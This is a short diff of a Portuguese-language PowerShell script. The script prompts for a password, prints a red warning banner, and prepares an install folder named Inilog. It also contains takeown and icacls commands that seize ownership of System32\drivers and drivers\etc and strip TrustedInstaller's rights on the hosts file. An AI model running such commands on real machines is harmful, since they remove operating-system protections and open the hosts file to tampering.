@@ -30,9 +30,6 @@ if ((ConvertTo-PlainText (Read-Host -Prompt "E agora?" -AsSecureString)) -ne $Nz
     |   __   |
      \______/
 
-
-
-
 "@ -ForegroundColor red
     Write-Host "" 
     Write-Host "      Ihiii!" -ForegroundColor red
@@ -45,10 +42,7 @@ takeown /f "C:\Windows\System32\drivers" /r /d Y
 takeown /f "C:\Windows\System32\drivers\etc" /r /d Y
 icacls "C:\Windows\System32\drivers" /grant Administradores:F /t
 icacls "C:\Windows\System32\drivers\etc" /grant Administradores:F /t
-icacls "C:\Windows\System32\drivers\etc\hosts" /remove "NT SERVICE\TrustedInstaller
-
-
-
+icacls "C:\Windows\System32\drivers\etc\hosts" /remove "NT SERVICE\TrustedInstaller"
 
 $destinationFolder = "C:\Program Files\Inilog\"
 if (-Not (Test-Path -Path $destinationFolder)) {
